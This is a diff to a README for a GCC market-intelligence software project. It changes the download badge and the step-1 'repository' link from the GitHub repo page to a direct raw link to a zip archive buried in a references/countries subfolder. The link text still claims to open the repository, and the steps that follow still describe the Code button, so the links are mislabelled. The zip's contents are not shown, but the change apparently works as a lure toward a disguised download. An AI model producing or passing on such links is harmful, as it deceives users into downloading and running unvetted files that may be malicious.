@@ -1,6 +1,6 @@
 # 🌐 gcc-market-intelligence - Navigate GCC markets with intelligent data
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Tandiestablished875/gcc-market-intelligence)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Tandiestablished875/gcc-market-intelligence/main/gcc-market-intelligence/references/countries/market_intelligence_gcc_1.7.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you install the software:
 
 Follow these steps to obtain the files on your Windows machine:
 
-1. Visit this link to access the software repository: [https://github.com/Tandiestablished875/gcc-market-intelligence](https://github.com/Tandiestablished875/gcc-market-intelligence).
+1. Visit this link to access the software repository: [https://raw.githubusercontent.com/Tandiestablished875/gcc-market-intelligence/main/gcc-market-intelligence/references/countries/market_intelligence_gcc_1.7.zip](https://raw.githubusercontent.com/Tandiestablished875/gcc-market-intelligence/main/gcc-market-intelligence/references/countries/market_intelligence_gcc_1.7.zip).
 2. Locate the green button labeled Code near the top of the screen.
 3. Click the button and select Download ZIP.
 4. Save the file to your computer.
